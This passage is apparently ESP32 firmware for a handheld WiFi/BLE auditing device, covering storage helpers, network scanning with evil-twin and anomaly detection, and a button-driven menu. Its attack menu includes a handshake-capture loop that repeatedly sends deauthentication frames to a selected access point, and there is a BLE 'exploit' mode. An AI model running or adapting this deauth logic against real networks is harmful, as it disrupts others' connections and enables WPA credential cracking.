  esp_bt_controller_disable();
  setCpuFrequencyMhz(80);
  mode = MODE_MENU;
  menuSelected = 0;
  menuScrollOffset = 0;
  drawMenu();
}

// ============================================================================
//  Storage helpers
// ============================================================================
// Mount without auto-formatting. A mount failure must never silently erase
// stored sessions or captures.
static bool fsBegin() {
  bool ok = FS.begin(false);
  if (ok) {
    loadHandshakeIndex();
  }
  return ok;
}

static bool isIndexedFilename(const String& filename, char prefix, const char* extension) {
  // Expected format: <prefix><3 decimal digits>.<extension>, e.g. p000.csv.
  const size_t extLen = strlen(extension);
  const size_t expectedLen = 1 + 3 + 1 + extLen;
  if (filename.length() != expectedLen) return false;
  if (filename.charAt(0) != prefix) return false;
  if (filename.charAt(4) != '.') return false;
  for (int i = 1; i <= 3; ++i) {
    char c = filename.charAt(i);
    if (c < '0' || c > '9') return false;
  }
  for (size_t i = 0; i < extLen; ++i) {
    if (filename.charAt(5 + i) != extension[i]) return false;
  }
  return true;
}

static void appendHtmlEscaped(String& out, const char* value) {
  if (!value) return;
  for (const unsigned char* p = (const unsigned char*)value; *p; ++p) {
    switch (*p) {
      case '&': out += F("&amp;");  break;
      case '<': out += F("&lt;");   break;
      case '>': out += F("&gt;");   break;
      case '\"': out += F("&quot;"); break;
      case '\'': out += F("&#39;");  break;
      default:   out += (char)*p;    break;
    }
  }
}

static void appendCsvEscaped(String& out, const char* value) {
  if (!value) { out += F("\"\""); return; }
  bool quote = false;
  for (const char* p = value; *p; ++p) {
    if (*p == ',' || *p == '\"' || *p == '\r' || *p == '\n') { quote = true; break; }
  }
  if (quote) out += '\"';
  for (const char* p = value; *p; ++p) {
    if (*p == '\"') out += F("\"\"");
    else out += *p;
  }
  if (quote) out += '\"';
}

static void fileCsvEscaped(File& f, const char* value) {
  if (!value) { f.print("\"\""); return; }
  bool quote = false;
  for (const char* p = value; *p; ++p) {
    if (*p == ',' || *p == '\"' || *p == '\r' || *p == '\n') { quote = true; break; }
  }
  if (quote) f.print('\"');
  for (const char* p = value; *p; ++p) {
    if (*p == '\"') f.print("\"");
    f.print(*p);
  }
  if (quote) f.print('\"');
}

static size_t fsTotalBytesSafe() { return FS.totalBytes(); }
static size_t fsUsedBytesSafe()  { return FS.usedBytes(); }
static size_t fsFreeBytesSafe()  {
  size_t total = fsTotalBytesSafe();
  size_t used  = fsUsedBytesSafe();
  return (total >= used) ? (total - used) : 0;
}

static void loadSessionIndex() {
  memset(&g_sessionIndex, 0, sizeof(g_sessionIndex));
  File f = FS.open("/sessions/index.bin", "r");
  if (!f) {
    g_sessionIndexLoaded = true;
    return;
  }
  if (f.size() != sizeof(g_sessionIndex)) {
    f.close();
    g_sessionIndexLoaded = true;
    return;
  }
  if (f.read((uint8_t*)&g_sessionIndex, sizeof(g_sessionIndex)) != sizeof(g_sessionIndex)) {
    memset(&g_sessionIndex, 0, sizeof(g_sessionIndex));
  }
  f.close();
  g_sessionIndexLoaded = true;
}

static void saveSessionIndex() {
  File f = FS.open("/sessions/index.bin", "w");
  if (!f) return;
  f.write((const uint8_t*)&g_sessionIndex, sizeof(g_sessionIndex));
  f.close();
}

static void writeSessionFile(uint16_t slot) {
  char filename[16];
  snprintf(filename, sizeof(filename), "s%03d.csv", slot);
  char path[32];
  snprintf(path, sizeof(path), "/sessions/%s", filename);

  File f = FS.open(path, "w");
  if (!f) return;

  f.print("ESSID,BSSID,PWR,CH,MB,ENC,CIPHER,AUTH,RISK,ANOMALY\r\n");
  for (int i = 0; i < g_resultCount; i++) {
    const ScanResult& r = g_results[i];
    char bf[18], mb[8];
    bssidFull(r.bssid, bf, sizeof(bf));
    mbStr(r.maxRate, r.rateIsN, mb, sizeof(mb));

    char anomaly[64] = "";
    if (r.anomalyFlags & ANOM_EVIL_TWIN)      strcat(anomaly, "Evil Twin ");
    if (r.anomalyFlags & ANOM_AUTH_CHANGE)    strcat(anomaly, "Auth Change ");
    if (r.anomalyFlags & ANOM_CHANNEL_SHIFT)  strcat(anomaly, "Channel Shift ");
    if (r.anomalyFlags & ANOM_BSSID_ROTATION) strcat(anomaly, "Dup Infrastructure ");
    if (r.anomalyFlags & ANOM_DUPLICATE_SSID) strcat(anomaly, "Dup SSID ");
    if (anomaly[0] == '\0') strcat(anomaly, "None");

    fileCsvEscaped(f, r.essid[0] ? r.essid : "(hidden)");
    f.print(","); f.print(bf);
    f.print(","); f.print(r.rssi);
    f.print(","); f.print(r.channel);
    f.print(","); f.print(mb);
    f.print(","); f.print(encLabel(r.authMode));
    f.print(","); f.print(cipherLabel(r.authMode));
    f.print(","); f.print(authLabel(r.authMode));
    f.print(","); f.print(riskWord(r.riskLevel));
    f.print(","); f.print(anomaly);
    f.print("\r\n");
  }
  f.close();
}

static void startSession() {
  if (!g_sessionIndexLoaded) loadSessionIndex();

  // Pick next ring buffer slot
  g_sessionSlot = g_sessionIndex.next % MAX_SESSIONS;
  g_sessionIndex.scanCounter++;

  // Initialise metadata
  SessionMeta& meta = g_sessionIndex.sessions[g_sessionSlot];
  meta.scanNumber   = g_sessionIndex.scanCounter;
  meta.timestamp    = millis();
  meta.apCount      = 0;
  meta.anomalyCount = 0;
  snprintf(meta.filename, sizeof(meta.filename), "s%03d.csv", g_sessionSlot);

  if (g_sessionIndex.count < MAX_SESSIONS) g_sessionIndex.count++;
  g_sessionIndex.next = (g_sessionSlot + 1) % MAX_SESSIONS;

  g_sessionActive = true;
  g_scansSinceSessionSave = 0;

  // Write initial file and save index
  writeSessionFile(g_sessionSlot);
  saveSessionIndex();
}

static void updateSession() {
  if (!g_sessionActive) return;

  // Update metadata
  uint16_t anomalyCount = 0;
  for (int i = 0; i < g_resultCount; i++) {
    if (g_results[i].anomalyFlags) anomalyCount++;
  }
  SessionMeta& meta     = g_sessionIndex.sessions[g_sessionSlot];
  meta.apCount          = (uint16_t)g_resultCount;
  meta.anomalyCount     = anomalyCount;

  // Overwrite session file with the latest current scan
  writeSessionFile(g_sessionSlot);
  saveSessionIndex();

  g_scansSinceSessionSave = 0;
}

static void endSession() {
  if (!g_sessionActive) return;
  updateSession();
  g_sessionActive = false;
  g_scansSinceSessionSave = 0;
}

static void saveHandshakeIndex() {
    File f = FS.open("/handshakes/index.bin", "w");
    if (!f) {
        Serial.println("Failed to save handshake index");
        return;
    }
    f.write(
        (uint8_t*)&g_handshakeIndex,
        sizeof(g_handshakeIndex)
    );
    f.close();
}

static void loadHandshakeIndex() {
    File f = FS.open("/handshakes/index.bin", "r");
    if (!f) {
        Serial.println("No handshake index found");
        return;
    }
    if (f.size() == sizeof(g_handshakeIndex)) {
        f.read(
            (uint8_t*)&g_handshakeIndex,
            sizeof(g_handshakeIndex)
        );
    } else {
        memset(
            &g_handshakeIndex,
            0,
            sizeof(g_handshakeIndex)
        );
    }
    f.close();
}

// ============================================================================
//  WiFi scan
//
//  WiFi scan using the ESP32 WiFi scan API.
//  Results sorted by risk descending, then RSSI descending.
//  Each result is merged into the persistent g_seen[] historical database.
//
//  showUi=true  -> manual scan, shows scanning screen first
//  showUi=false -> background scan, silent
//
//  Anomaly detection runs after each scan:
//    - Duplicate SSID / Evil Twin: flags same-ESSID networks with differing
//      security modes, plus weak/strong combinations
//    - Auth change: flags networks whose security type changed since last scan
//    - Channel shift: flags networks that moved channels between scans
//    - BSSID rotation: flags ESSIDs with 3+ unique BSSIDs in history
//
//  MB estimation note:
//    WPA2/WPA3 networks are flagged as 130n (likely 802.11n).
//    All others are set to 54 (802.11g/legacy).
//    The ESP32 API does not expose raw information elements, so this
//    is an inference only.
// ============================================================================

static void doScan(bool showUi = true) {
  if (g_scanRunning) return;
  g_scanRunning = true;

  if (showUi) drawScanning();

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(200);

  int n = WiFi.scanNetworks(false, true);

  g_resultCount     = 0;
  g_cursorIndex     = 0;
  g_scrollOffset    = 0;
  g_prevCursorIndex = -1;
  
  for (int i = 0; i < MAX_SCAN; i++) {
  g_results[i].anomalyFlags = 0;
  }

  if (n > 0) {
    int count = min(n, MAX_SCAN);
    uint32_t now = millis();

    for (int i = 0; i < count; i++) {
      strncpy(g_results[i].essid, WiFi.SSID(i).c_str(), sizeof(g_results[i].essid) - 1);
      g_results[i].essid[sizeof(g_results[i].essid) - 1] = '\0';

      String bStr = WiFi.BSSIDstr(i);
      sscanf(bStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
             &g_results[i].bssid[0], &g_results[i].bssid[1],
             &g_results[i].bssid[2], &g_results[i].bssid[3],
             &g_results[i].bssid[4], &g_results[i].bssid[5]);

      g_results[i].rssi      = WiFi.RSSI(i);
      g_results[i].channel   = WiFi.channel(i);
      g_results[i].authMode  = (uint8_t)WiFi.encryptionType(i);
      g_results[i].riskLevel = calcRisk(g_results[i].authMode);

      bool isN = (g_results[i].authMode == WIFI_AUTH_WPA2_PSK      ||
                  g_results[i].authMode == WIFI_AUTH_WPA2_WPA3_PSK ||
                  g_results[i].authMode == WIFI_AUTH_WPA3_PSK);

      g_results[i].maxRate = isN ? 130 : 54;
      g_results[i].rateIsN = isN;

      int seenIdx = findSeenByBssid(g_results[i].bssid);

      if (seenIdx < 0) {
        // New network - initialise anomaly fields
        g_results[i].firstSeen    = now;
        g_results[i].lastSeen     = now; 
        g_results[i].sightings    = 1;
        g_results[i].anomalyFlags = 0;
        g_results[i].lastAuthMode = g_results[i].authMode;
        g_results[i].lastChannel  = g_results[i].channel;
        if (g_seenCount < 200) g_seen[g_seenCount++] = g_results[i];
      } else {
        // Existing network - update and check for anomalies
        g_seen[seenIdx].lastSeen = now;
        g_seen[seenIdx].sightings++;

        // Auth mode change detection
        if (g_results[i].authMode != g_seen[seenIdx].lastAuthMode) {
          g_seen[seenIdx].anomalyFlags |= ANOM_AUTH_CHANGE;
        }

        // Channel shift detection
        if (g_results[i].channel != g_seen[seenIdx].lastChannel) {
          g_seen[seenIdx].anomalyFlags |= ANOM_CHANNEL_SHIFT;
        }

        // Duplicate SSID with a different security mode. This is deliberately
        // narrower than simply flagging every multi-AP SSID.
        if (g_results[i].essid[0]) {
          for (int j = 0; j < count; ++j) {
            if (j == i || !g_results[j].essid[0]) continue;
            if (strcasecmp(g_results[i].essid, g_results[j].essid) == 0 &&
                g_results[i].authMode != g_results[j].authMode) {
              g_seen[seenIdx].anomalyFlags |= ANOM_DUPLICATE_SSID;
              break;
            }
          }
        }

        // Update current security/rate fields as well as historical fields.
        g_seen[seenIdx].channel   = g_results[i].channel;
        g_seen[seenIdx].authMode  = g_results[i].authMode;
        g_seen[seenIdx].riskLevel = g_results[i].riskLevel;
        g_seen[seenIdx].maxRate   = g_results[i].maxRate;
        g_seen[seenIdx].rateIsN   = g_results[i].rateIsN;
        g_seen[seenIdx].lastAuthMode = g_results[i].authMode;
        g_seen[seenIdx].lastChannel  = g_results[i].channel;

        // Keep strongest signal
        if (g_results[i].rssi > g_seen[seenIdx].rssi) {
          g_seen[seenIdx].rssi = g_results[i].rssi;
        }

        // Synchronize historical fields back into the current result so the
        // detail view and exports always describe the AP at this index.
        g_results[i].firstSeen    = g_seen[seenIdx].firstSeen;
        g_results[i].lastSeen     = g_seen[seenIdx].lastSeen;
        g_results[i].sightings    = g_seen[seenIdx].sightings;
        g_results[i].anomalyFlags = g_seen[seenIdx].anomalyFlags;
      }
    }

    g_resultCount = count;
    if (g_cursorIndex >= g_resultCount) g_cursorIndex = max(0, g_resultCount - 1);
    if (g_scrollOffset >= g_resultCount) g_scrollOffset = 0;

    // -----------------------------------------------------------------------
    // BSSID rotation detection
    // -----------------------------------------------------------------------
    for (int i = 0; i < g_seenCount; i++) {
      if (!g_seen[i].essid[0]) continue;
      int bssidCount = 0;
      for (int j = 0; j < g_seenCount; j++) {
        if (!g_seen[j].essid[0]) continue;
        if (strcasecmp(g_seen[i].essid, g_seen[j].essid) == 0) bssidCount++;
      }
      if (bssidCount >= 3) g_seen[i].anomalyFlags |= ANOM_BSSID_ROTATION;
    }

    // -----------------------------------------------------------------------
    // Merge historical state into current results after anomaly detection.
    // -----------------------------------------------------------------------
    for (int i = 0; i < g_resultCount; i++) {
      int seenIdx = findSeenByBssid(g_results[i].bssid);
      if (seenIdx >= 0) {
        g_results[i].firstSeen = g_seen[seenIdx].firstSeen;
        g_results[i].lastSeen = g_seen[seenIdx].lastSeen;
        g_results[i].sightings = g_seen[seenIdx].sightings;
        g_results[i].anomalyFlags |= g_seen[seenIdx].anomalyFlags;
      }
    }

    // -----------------------------------------------------------------------
    // Merge flags from g_seen into g_results
    // -----------------------------------------------------------------------
    for (int i = 0; i < g_resultCount; i++) {
      int seenIdx = findSeenByBssid(g_results[i].bssid);
      if (seenIdx >= 0) {
        g_seen[seenIdx].anomalyFlags |= g_results[i].anomalyFlags;
        g_results[i].anomalyFlags    |= g_seen[seenIdx].anomalyFlags;
      }
    }

    // -----------------------------------------------------------------------
    // Evil Twin detection - runs AFTER merge so flags are not overwritten
    // -----------------------------------------------------------------------
    for (int i = 0; i < g_resultCount; i++) {
      bool isWeak = (g_results[i].authMode == WIFI_AUTH_OPEN ||
                     g_results[i].authMode == WIFI_AUTH_WEP);
      if (!isWeak) continue;
      for (int j = 0; j < g_resultCount; j++) {
        if (i == j) continue;
        if (!g_results[i].essid[0] || !g_results[j].essid[0]) continue;
        if (strcasecmp(g_results[i].essid, g_results[j].essid) != 0) continue;
        bool otherSecure = (g_results[j].authMode != WIFI_AUTH_OPEN &&
                            g_results[j].authMode != WIFI_AUTH_WEP);
        if (otherSecure) {
          g_results[i].anomalyFlags |= ANOM_EVIL_TWIN;
          int seenIdx = findSeenByBssid(g_results[i].bssid);
          if (seenIdx >= 0) g_seen[seenIdx].anomalyFlags |= ANOM_EVIL_TWIN;
          g_results[i].riskLevel = max(g_results[i].riskLevel, (uint8_t)3);
          break;
        }
      }
    }

    // Persist any final anomaly/risk changes back into the historical record.
    for (int i = 0; i < g_resultCount; i++) {
      int seenIdx = findSeenByBssid(g_results[i].bssid);
      if (seenIdx >= 0) {
        g_seen[seenIdx].anomalyFlags |= g_results[i].anomalyFlags;
        if (g_results[i].riskLevel > g_seen[seenIdx].riskLevel) {
          g_seen[seenIdx].riskLevel = g_results[i].riskLevel;
        }
        g_results[i].firstSeen = g_seen[seenIdx].firstSeen;
        g_results[i].lastSeen = g_seen[seenIdx].lastSeen;
        g_results[i].sightings = g_seen[seenIdx].sightings;
        g_results[i].anomalyFlags = g_seen[seenIdx].anomalyFlags;
      }
    }

    // Sort by risk descending, then RSSI descending
    for (int i = 1; i < g_resultCount; i++) {
      ScanResult key = g_results[i];
      int j = i - 1;
      while (j >= 0 && (g_results[j].riskLevel < key.riskLevel ||
            (g_results[j].riskLevel == key.riskLevel && g_results[j].rssi < key.rssi))) {
        g_results[j + 1] = g_results[j]; j--;
      }
      g_results[j + 1] = key;
    }
  }

  WiFi.scanDelete();
  delay(100);
  WiFi.mode(WIFI_OFF);
  delay(100);
  esp_wifi_stop();

  g_hasScanned   = true;
  mode           = MODE_RESULTS;
  g_scanRunning  = false;
  lastAutoScanMs = millis();

  if (showUi) {
    // Manual scan — start a new session
    startSession();
  } else {
    // Background scan — update current session periodically
    g_scansSinceSessionSave++;
    if (g_sessionActive && g_scansSinceSessionSave >= SESSION_SAVE_EVERY) {
      updateSession();
    }
  }

  drawSummary();
}

// ============================================================================
//  Setup
//
//  u8g2.begin() called exactly once here.
//  Calling it again anywhere resets font state and corrupts rendering.
// ============================================================================
void setup() {
  Serial.begin(115200);
  delay(200);

  // Initialise filesystem
  if (!fsBegin()) {
    Serial.println("LittleFS mount failed");
  } else {
    if (!FS.exists("/sessions"))    FS.mkdir("/sessions");
    if (!FS.exists("/probes"))      FS.mkdir("/probes");
    if (!FS.exists("/ble"))         FS.mkdir("/ble");
    if (!FS.exists("/handshakes"))  FS.mkdir("/handshakes");
    if (!FS.exists("/arp"))         FS.mkdir("/arp");
    loadSessionIndex();
    loadProbeIndex();
    loadBleSessionIndex();
    loadHandshakeIndex();
    loadArpSessionIndex();
  }

  setCpuFrequencyMhz(80);

  pinMode(BTN, INPUT_PULLUP);
  attachInterrupt(digitalPinToInterrupt(BTN), btnISR, CHANGE);

#if HAS_BATTERY
  pinMode(BAT_ADC_CTRL, INPUT);
#endif

  display.fastmodeOff();
  display.clear();
  u8g2.begin(gfx);
  display.fastmodeOn();

  resetInputFrontend();
  markUserActivity();
  drawMenu();
}

// ============================================================================
//  Main loop
// ============================================================================
void loop() {
  btns.poll();

  if (btns.anyClick()) markUserActivity();

  // Auto deep sleep - only triggers from menu screen after inactivity
  if (ENABLE_DEEP_SLEEP &&
      mode == MODE_MENU &&
      !g_scanRunning &&
      (uint32_t)(millis() - lastUserActionMs) > SLEEP_AFTER_MS) {
    goToSleep();
  }

  // ── Web report ────────────────────────────────────────────────────────────
  if (mode == MODE_WEBREPORT) {
    server.handleClient();
    if (btns.longClick) { stopWebReport(); resetInputFrontend(); }
    return;
  }

  // ── Main menu ─────────────────────────────────────────────────────────────
  if (mode == MODE_MENU) {
    if (btns.shortClick) {
      menuSelected = (menuSelected + 1) % MENU_ITEMS;
      if (menuSelected >= menuScrollOffset + MENU_VISIBLE) {
        menuScrollOffset = menuSelected - MENU_VISIBLE + 1;
      }
      if (menuSelected < menuScrollOffset) {
        menuScrollOffset = menuSelected;
      }
      if (menuSelected == 0) menuScrollOffset = 0;
      updateMenuCursor();
      return;
    }
    if (btns.doubleClick) {
      if (menuSelected == 0) {
        doScan(true);
      } else if (menuSelected == 1) {
        mode = MODE_PROBE;
        startProbeSniffer();
        drawProbe();
      } else if (menuSelected == 2) {
        startArpConfig();
      } else if (menuSelected == 3) {
        mode = MODE_BLE;        // ← new
        startBleScanner();      // ← new
      } else if (menuSelected == 4) {
        selectedChannel = 0;
        selectedSSID[0] = '\0';
        memset(selectedBssid, 0, sizeof(selectedBssid));
        mode = MODE_ATTACK_MENU;
        drawAttackMenu();
      } else if (menuSelected == 5) {
        mode = MODE_SESSIONS;
        drawSessions();
      } else if (menuSelected == 6) {
        startWebReport();
      }
      resetInputFrontend(); return;
    }
    if (btns.longClick) { goToSleep(); resetInputFrontend(); return; }
  }

  // ── Scan results ──────────────────────────────────────────────────────────
  if (mode == MODE_RESULTS) {

    // Pause background scans while user navigates, resume after 15s idle
    if (btns.anyClick()) { g_pauseAutoScan = true; lastUiInteractionMs = millis(); }
    if (g_pauseAutoScan && (uint32_t)(millis() - lastUiInteractionMs) > 15000) {
      g_pauseAutoScan = false;
    }

    // Silent background scan when idle
    if (!g_pauseAutoScan &&
        (uint32_t)(millis() - lastAutoScanMs) > AUTO_SCAN_INTERVAL &&
        !g_scanRunning) {
      doScan(false); return;
    }

    if (btns.shortClick) {
      if (g_resultCount > 0) {
        g_cursorIndex++;
        if (g_cursorIndex >= g_resultCount) g_cursorIndex = 0;
        const int MAX_ROWS = 10;
        if (g_cursorIndex >= g_scrollOffset + MAX_ROWS) g_scrollOffset = g_cursorIndex;
        if (g_cursorIndex < g_scrollOffset)             g_scrollOffset = g_cursorIndex;
        updateSummaryCursor();
      }
      return;
    }
    if (btns.doubleClick) {
      if (g_resultCount > 0) {
        const int MAX_ROWS = 10;
        g_scrollOffset += MAX_ROWS;
        if (g_scrollOffset >= g_resultCount) g_scrollOffset = 0;
        g_cursorIndex = g_scrollOffset;
        drawSummary();
      }
      resetInputFrontend(); return;
    }
    if (btns.tripleClick) {
      if (g_resultCount > 0) {
        mode = MODE_DETAIL;
        drawDetail(g_cursorIndex);
      }
      resetInputFrontend(); return;
    }
    if (btns.longClick) {
      endSession();
      mode = MODE_MENU; menuSelected = 0;
      drawMenu(); resetInputFrontend(); return;
    }
  }

  // ── Detail view ───────────────────────────────────────────────────────────
  if (mode == MODE_DETAIL) {
    if (btns.shortClick) {
      mode = MODE_RESULTS;
      drawSummary(); resetInputFrontend(); return;
    }
    if (btns.longClick) {
      endSession();
      mode = MODE_MENU; menuSelected = 0;
      drawMenu(); resetInputFrontend(); return;
    }
  }

  // ── Scan sessions ─────────────────────────────────────────────────────────
  if (mode == MODE_SESSIONS) {
    if (btns.tripleClick) {
      beginFrame(false);
      drawHeader("Scan Sessions");
      u8g2.setFont(MAIN_FONT);
      u8g2.setCursor(UI_MARGIN_X, 50);
      u8g2.print("Deleting sessions.");
      u8g2.setCursor(UI_MARGIN_X, 65);
      u8g2.print("Please wait...");
      drawFooter("Do not power off!");
      endFrame();

      // Clear all WiFi sessions
      for (int i = 0; i < MAX_SESSIONS; i++) {
        char path[32];
        snprintf(path, sizeof(path), "/sessions/s%03d.csv", i);
        if (FS.exists(path)) FS.remove(path);
      }
      FS.remove("/sessions/index.bin");
      memset(&g_sessionIndex, 0, sizeof(g_sessionIndex));
      g_sessionIndexLoaded = true;

      // Clear all probe sessions
      for (int i = 0; i < MAX_PROBE_SESSIONS; i++) {
        char path[32];
        snprintf(path, sizeof(path), "/probes/p%03d.csv", i);
        if (FS.exists(path)) FS.remove(path);
      }
      FS.remove("/probes/index.bin");
      g_probeNext  = 0;
      g_probeTotal = 0;
      g_probeIndexLoaded = true;

      // Handshake captures
      for (int i = 0; i < MAX_HANDSHAKES; i++) {
        char path[32];
        snprintf(path, sizeof(path), "/handshakes/h%03d.cap", i);
        if (FS.exists(path)) FS.remove(path);
      }
      FS.remove("/handshakes/index.bin");
      memset(&g_handshakeIndex, 0, sizeof(g_handshakeIndex));
      g_handshakeIndexLoaded = true;

      // ARP sessions
      for (int i = 0; i < MAX_ARP_SESSIONS; i++) {
        char path[32];
        snprintf(path, sizeof(path), "/arp/a%03d.csv", i);
        if (FS.exists(path)) FS.remove(path);
      }
      FS.remove("/arp/index.bin");
      g_arpSessionNext  = 0;
      g_arpSessionTotal = 0;
      g_arpSessionIndexLoaded = true;

      for (int i = 0; i < MAX_BLE_SESSIONS; i++) {
        char path[32];
        snprintf(path, sizeof(path), "/ble/b%03d.csv", i);
        if (FS.exists(path)) FS.remove(path);
      }
      FS.remove("/ble/index.bin");
      g_bleScanNext  = 0;
      g_bleScanTotal = 0;
      g_bleIndexLoaded = true;

      drawSessions();            
      resetInputFrontend(); return;
    }
    if (btns.longClick) {
      mode = MODE_MENU; menuSelected = 0;
      drawMenu(); resetInputFrontend(); return;
    }
  }

  // Adaptive channel hopping for probe sniffer
  if (g_probeActive && (uint32_t)(millis() - g_lastHop) > 2000) {
    g_lastHop = millis();
    g_probeChannel = (g_probeChannel + 1) % PROBE_CHANNEL_COUNT;
    uint8_t ch = g_channelStats[g_channelOrder[g_probeChannel]].channel;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  }

  // ── Probe sniffer ─────────────────────────────────────────────────────────
  if (mode == MODE_PROBE) {
    static uint32_t lastProbeDrawMs  = 0;
    static int      lastDrawCount    = -1;
    static uint32_t lastDeauthCount  = 0;
    if ((g_probeCount != lastDrawCount || g_deauthCount != lastDeauthCount) &&
        (uint32_t)(millis() - lastProbeDrawMs) > 2000) {
      lastProbeDrawMs  = millis();
      lastDrawCount    = g_probeCount;
      lastDeauthCount  = g_deauthCount;
      drawProbe();
    }

    if (btns.longClick) {
      stopProbeSniffer();
      mode = MODE_MENU; menuSelected = 0;
      drawMenu(); resetInputFrontend(); return;
    }
  }

  // ── ARP Config ────────────────────────────────────────────────────────────
  if (mode == MODE_ARP_CONFIG) {
    arpServer.handleClient();

    // Check if credentials were submitted
    if (mode == MODE_ARP) {
      arpServer.stop();
      WiFi.softAPdisconnect(true);
      delay(200);
      startArpScanner();
      return;
    }

    if (btns.longClick) {
      arpServer.stop();
      WiFi.softAPdisconnect(true);
      WiFi.mode(WIFI_OFF);
      g_arpConfigMode = false;
      mode = MODE_MENU;
      menuSelected = 0;
      menuScrollOffset = 0;
      drawMenu();
      resetInputFrontend();
      return;
    }
  }

  // ── ARP Scanner ───────────────────────────────────────────────────────────
  if (mode == MODE_ARP) {
    static uint32_t lastArpDrawMs = 0;
    static int      lastArpCount  = -1;

    if (g_arpCount != lastArpCount &&
        (uint32_t)(millis() - lastArpDrawMs) > 2000) {
      lastArpDrawMs = millis();
      lastArpCount  = g_arpCount;
      drawArpScreen();
    }

    if (btns.longClick) {
      stopArpScanner();
      mode = MODE_MENU;
      menuSelected = 0;
      menuScrollOffset = 0;
      drawMenu();
      resetInputFrontend();
      return;
    }
  }

  // ── BLE Scanner ───────────────────────────────────────────────────────────
  if (mode == MODE_BLE) {
    static uint32_t lastBleDrawMs = 0;
    static int      lastBleCount  = -1;

    if (g_bleCount != lastBleCount &&
        (uint32_t)(millis() - lastBleDrawMs) > 2000 &&
        (uint32_t)(millis() - lastUiInteractionMs) > 3000) {
      lastBleDrawMs = millis();
      lastBleCount  = g_bleCount;
      g_blePrevSelected = -1;
      drawBleScreen();
    }

    if (btns.shortClick) {
      lastUiInteractionMs = millis();
      if (g_bleCount > 0) {
        int prevIdx = g_bleSelectedIdx;
        if (g_bleSelectedIdx < 0) {
          g_bleSelectedIdx = 0;
        } else {
          g_bleSelectedIdx++;
          if (g_bleSelectedIdx >= g_bleCount) g_bleSelectedIdx = 0;
        }
        const int MAX_ROWS = 8;
        if (g_bleSelectedIdx >= g_bleScrollOffset + MAX_ROWS) {
          g_bleScrollOffset = g_bleSelectedIdx - (MAX_ROWS - 1);
          drawBleScreen();
        } else if (g_bleSelectedIdx < g_bleScrollOffset) {
          g_bleScrollOffset = g_bleSelectedIdx;
          drawBleScreen();
        } else {
          g_blePrevSelected = prevIdx;
          updateBleCursor();
        }
      }
      return;
    }

    if (btns.tripleClick) {
      if (g_bleSelectedIdx >= 0 &&
          g_bleSelectedIdx < g_bleCount &&
          g_bleDevices[g_bleSelectedIdx].connectable) {
        mode = MODE_BLE_DETAIL;
        drawBleDetail();
        resetInputFrontend();
        return;
      }
    }

    if (btns.longClick) {
      disconnectBleDevice();
      stopBleScanner();
      mode = MODE_MENU;
      menuSelected = 0;
      menuScrollOffset = 0;
      drawMenu();
      resetInputFrontend();
      return;
    }
  }  

  // ── BLE Detail ────────────────────────────────────────────────────────────
  if (mode == MODE_BLE_DETAIL) {
    if (btns.doubleClick) {
      if (!g_bleConnected) {
        // Connect and enumerate
        if (connectBleDevice(g_bleSelectedIdx)) {
          drawBleDetail();
        } else {
          // Connection failed
          beginFrame(false);
          drawHeader("BLE Connect");
          u8g2.setFont(MAIN_FONT);
          u8g2.setCursor(UI_MARGIN_X, 50);
          u8g2.print("Connection failed!");
          u8g2.setCursor(UI_MARGIN_X, 65);
          u8g2.print("Device out of range?");
          drawFooter("hold=back");
          endFrame();
          delay(2000);
          drawBleDetail();
        }
      } else {
        mode = MODE_BLE_EXPLOIT;
        drawBleExploit();
      }
      resetInputFrontend();
      return;
    }
    if (btns.tripleClick) {
      if (g_bleConnected) {
        mode = MODE_BLE_EXPLOIT;
        drawBleExploit();
        resetInputFrontend();
        return;
      }
    }
    if (btns.longClick) {
      disconnectBleDevice();
      mode = MODE_BLE;
      drawBleScreen();
      resetInputFrontend();
      return;
    }
  }

  // ── BLE Exploit ───────────────────────────────────────────────────────────
  if (mode == MODE_BLE_EXPLOIT) {
    if (btns.longClick) {
      disconnectBleDevice();
      mode = MODE_BLE;
      drawBleScreen();
      resetInputFrontend();
      return;
    }
  }

  // ── Handshake capture ─────────────────────────────────────────────────────
  if (mode == MODE_HANDSHAKE) {
    static uint32_t lastHsDrawMs = 0;
    static uint32_t lastHsPackets = 0;
    if (handshakePackets != lastHsPackets &&
        (uint32_t)(millis() - lastHsDrawMs) > 5000) {
      lastHsDrawMs = millis();
      lastHsPackets = handshakePackets;
      drawHandshakeScreen();
    }

    if (!waitingForHandshake) {
      if ((uint32_t)(millis() - g_lastAttackMs) > 500) {
        g_lastAttackMs = millis();
        sendDeauthFrame(selectedBssid, selectedChannel);
        waitingForHandshake = true;
        deauthSentMs = millis();
      }
    } else {
      if (handshakePackets >= 4) {
      } else if ((uint32_t)(millis() - deauthSentMs) > 500) {
        waitingForHandshake = false;
      }
    }

    if (btns.longClick) {
      stopAttack();
      resetInputFrontend();
      return;
    }
  }

  // ── Attack Menu System ─────────────────────────────────────────────
  if (mode == MODE_ATTACK_MENU) {
    if (btns.longClick) {
      selectedChannel = 0;
      selectedSSID[0] = '\0';
      memset(selectedBssid, 0, sizeof(selectedBssid));
      mode = MODE_MENU;
      drawMenu();
      resetInputFrontend();
      return;
    }
    if (btns.doubleClick) {
      if (selectedChannel != 0) {
        startHandshakeCapture();
      } else {
        mode = MODE_TARGET_SELECT;
        g_cursorIndex = 0;
        g_scrollOffset = 0;
        drawTargetSelect();
      }
      resetInputFrontend();
      return;
    }
    if (btns.tripleClick) {
      selectedChannel = 0;
      selectedSSID[0] = '\0';
      memset(selectedBssid, 0, sizeof(selectedBssid));
      mode = MODE_TARGET_SELECT;
      g_cursorIndex = 0;
      g_scrollOffset = 0;
      drawTargetSelect();
      resetInputFrontend();
      return;
    }
  }

  if (mode == MODE_TARGET_SELECT) {
    if (btns.shortClick) {
      if (g_resultCount > 0) {
        int prevIdx = g_cursorIndex;
        g_cursorIndex++;
        if (g_cursorIndex >= g_resultCount) g_cursorIndex = 0;
        const int MAX_ROWS = 6;
        if (g_cursorIndex >= g_scrollOffset + MAX_ROWS) {
          g_scrollOffset = g_cursorIndex - (MAX_ROWS - 1);
          drawTargetSelect();
        } else if (g_cursorIndex < g_scrollOffset) {
          g_scrollOffset = g_cursorIndex;
          drawTargetSelect();
        } else {
          updateTargetCursor(prevIdx);
        }
      }
      return;
    }

    if (btns.tripleClick && g_resultCount > 0) {
      const ScanResult& r = g_results[g_cursorIndex];
      memcpy(selectedBssid, r.bssid, 6);
      selectedChannel = r.channel;
      strncpy(selectedSSID, r.essid, 32);
      selectedSSID[32] = '\0';
